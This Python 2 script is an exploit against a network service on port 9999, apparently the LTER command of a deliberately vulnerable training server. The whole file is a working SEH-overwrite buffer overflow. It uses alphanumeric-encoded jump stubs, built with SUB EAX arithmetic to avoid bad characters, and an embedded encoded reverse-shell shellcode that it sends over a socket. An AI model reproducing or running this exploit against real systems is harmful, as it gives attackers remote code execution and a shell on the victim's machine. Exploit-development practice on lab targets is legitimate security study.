#!/usr/bin/env python

import sys
import socket


host = '192.168.1.10'
port = 9999


try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except:

	print 'Socket() failed'
	sys.exit(1)

first_jump = '\x74\x0b\x41\x41' #jnz short 11  bytes
#SEH_redirect = '\xb4\x10\x50\x62'  (with badchar, will not work)
SEH_redirect = '\x0b\x12\x50\x62'
#EB 80 aka Reverse Jump
second_jump = (
'\x54' 			#push esp
'\x58'			#pop eax
'\x66\x05\x75\x0d'	#add ax, 0d71
'\x66\x05\x65\x04'	#add ax, 0465
'\x50'			#push eax
'\x5c'			#pop esp
'\x25\x4a\x4d\x4e\x55' #zero out eax
'\x25\x35\x32\x31\x2a' #zero out eax	
'\x2d\x55\x33\x10\x32' #SUB EAX, 32103355
'\x2d\x55\x33\x10\x32' #SUB EAX, 32103355
'\x2d\x6b\x18\x4f\x0b' #SUB EAX, 0B4f186B
'\x50')		       #PUSH EAX

third_jump = (
#realigning ESP to point to where we want our decode shellcode will be
'\x54'			#push esp
'\x58'			#pop eax
'\x2c\x3a'		#sub al, 3a
'\x50'			#push eax
'\x5c'			#pop esp

#\x81\xec\x48\x0d\x00\x00\xff\xe4 (SUB ESP, 0DA0, / JMP ESP)


#\x00\x00\xff\xe4
#0 - E4FF0000 = 1B01 0000
#72626655 + 72626655  + 463C3356 = 1B01 0000
#0 - 72626655 - 72626655 - 363C3356 =  E4FF 0000

'\x25\x4a\x4d\x4e\x55' #zero out eax
'\x25\x35\x32\x31\x2a' #zero out eax  
'\x2d\x55\x66\x62\x72' #SUB EAX, 72626655
'\x2d\x55\x66\x62\x72' #SUB EAX, 72626655
'\x2d\x56\x33\x3c\x36' #SUB EAX, 363C3356
'\x50'		       #PUSH EAX

#\x81\xec\x48\x0d
#0 - 0D48EC81 = F2B7 137F
#60216001 + 60216001 + 3274537D = F25F 137F
#0 - 60216001 - 60216001 - 3274537D = 0D48EC81

'\x25\x4a\x4d\x4e\x55' #zero out eax
'\x25\x35\x32\x31\x2a' #zero out eax 
'\x2d\x01\x60\x21\x60' #SUB EAX, 60216001
'\x2d\x01\x60\x21\x60' #SUB EAX, 60216001
'\x2d\x7d\x53\x74\x32' #SUB EAX, 2E74537D
'\x50')		       #PUSH EAX

reverse_shell = (
"\x21\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x69\x78\x6d\x52\x55\x50"
"\x67\x70\x63\x30\x51\x70\x6f\x79\x68\x65\x66\x51\x69\x50\x61"
"\x74\x4e\x6b\x36\x30\x66\x50\x4e\x6b\x76\x32\x74\x4c\x4e\x6b"
"\x43\x62\x52\x34\x4e\x6b\x42\x52\x51\x38\x76\x6f\x4d\x67\x63"
"\x7a\x46\x46\x70\x31\x4b\x4f\x4e\x4c\x35\x6c\x70\x61\x51\x6c"
"\x34\x42\x66\x4c\x71\x30\x7a\x61\x68\x4f\x74\x4d\x75\x51\x79"
"\x57\x49\x72\x5a\x52\x53\x62\x62\x77\x4e\x6b\x31\x42\x62\x30"
"\x6c\x4b\x33\x7a\x45\x6c\x6c\x4b\x50\x4c\x57\x61\x62\x58\x68"
"\x63\x47\x38\x66\x61\x48\x51\x76\x31\x6e\x6b\x31\x49\x75\x70"
"\x63\x31\x58\x53\x6e\x6b\x53\x79\x77\x68\x5a\x43\x34\x7a\x50"
"\x49\x6e\x6b\x50\x34\x4e\x6b\x35\x51\x59\x46\x44\x71\x69\x6f"
"\x4e\x4c\x6a\x61\x78\x4f\x44\x4d\x37\x71\x58\x47\x55\x68\x69"
"\x70\x70\x75\x59\x66\x57\x73\x53\x4d\x4b\x48\x47\x4b\x61\x6d"
"\x46\x44\x43\x45\x4b\x54\x43\x68\x4e\x6b\x30\x58\x54\x64\x73"
"\x31\x58\x53\x30\x66\x6e\x6b\x66\x6c\x70\x4b\x6e\x6b\x70\x58"
"\x77\x6c\x67\x71\x38\x53\x4e\x6b\x43\x34\x6c\x4b\x65\x51\x48"
"\x50\x4f\x79\x62\x64\x76\x44\x75\x74\x63\x6b\x63\x6b\x55\x31"
"\x66\x39\x31\x4a\x63\x61\x79\x6f\x4d\x30\x43\x6f\x61\x4f\x51"
"\x4a\x6e\x6b\x77\x62\x6a\x4b\x6c\x4d\x71\x4d\x31\x78\x56\x53"
"\x57\x42\x65\x50\x45\x50\x61\x78\x50\x77\x52\x53\x50\x32\x43"
"\x6f\x31\x44\x35\x38\x42\x6c\x71\x67\x64\x66\x65\x57\x59\x6f"
"\x68\x55\x68\x38\x6e\x70\x33\x31\x67\x70\x65\x50\x35\x79\x4f"
"\x34\x32\x74\x56\x30\x53\x58\x54\x69\x4f\x70\x42\x4b\x53\x30"
"\x69\x6f\x4e\x35\x72\x70\x70\x50\x76\x30\x52\x70\x33\x70\x32"
"\x70\x33\x70\x62\x70\x33\x58\x48\x6a\x56\x6f\x39\x4f\x6b\x50"
"\x79\x6f\x49\x45\x4f\x67\x51\x7a\x73\x35\x72\x48\x59\x50\x59"
"\x38\x45\x51\x44\x4d\x51\x78\x57\x72\x35\x50\x65\x54\x6e\x32"
"\x6e\x69\x69\x76\x61\x7a\x34\x50\x71\x46\x72\x77\x31\x78\x6f"
"\x69\x6c\x65\x32\x54\x45\x31\x59\x6f\x49\x45\x4b\x35\x39\x50"
"\x34\x34\x34\x4c\x49\x6f\x62\x6e\x64\x48\x50\x75\x58\x6c\x32"
"\x48\x4c\x30\x6e\x55\x4e\x42\x72\x76\x79\x6f\x5a\x75\x33\x58"
"\x32\x43\x32\x4d\x35\x34\x45\x50\x6b\x39\x6a\x43\x70\x57\x62"
"\x77\x73\x67\x70\x31\x5a\x56\x50\x6a\x67\x62\x53\x69\x33\x66"
"\x7a\x42\x79\x6d\x70\x66\x68\x47\x73\x74\x67\x54\x55\x6c\x56"
"\x61\x35\x51\x6e\x6d\x63\x74\x31\x34\x76\x70\x4f\x36\x53\x30"
"\x77\x34\x66\x34\x50\x50\x61\x46\x70\x56\x63\x66\x71\x56\x73"
"\x66\x42\x6e\x46\x36\x52\x76\x76\x33\x42\x76\x62\x48\x52\x59"
"\x48\x4c\x65\x6f\x4d\x56\x39\x6f\x4b\x65\x6d\x59\x6d\x30\x72"
"\x6e\x46\x36\x63\x76\x4b\x4f\x56\x50\x31\x78\x63\x38\x4f\x77"
"\x47\x6d\x71\x70\x6b\x4f\x5a\x75\x6f\x4b\x69\x6e\x74\x4e\x35"
"\x62\x48\x6a\x72\x48\x4f\x56\x6d\x45\x6d\x6d\x4f\x6d\x4b\x4f"
"\x49\x45\x57\x4c\x43\x36\x31\x6c\x55\x5a\x4b\x30\x4b\x4b\x39"
"\x70\x53\x45\x45\x55\x4d\x6b\x31\x57\x45\x43\x71\x62\x70\x6f"
"\x43\x5a\x43\x30\x46\x33\x4b\x4f\x4b\x65\x41\x41")

buff = '\41' * 105 + reverse_shell + '\x41' * (3340-len(reverse_shell)) + third_jump + '\x41' * (70-len(third_jump)) + first_jump + SEH_redirect + '\x41' * 5 + second_jump + '\x44' * (5000-3515-4-4-16)

command = 'LTER /.:/' + buff

s.connect((host, port))
print s.recv(1024)
s.send(command)
print s.recv(1024)
s.close()
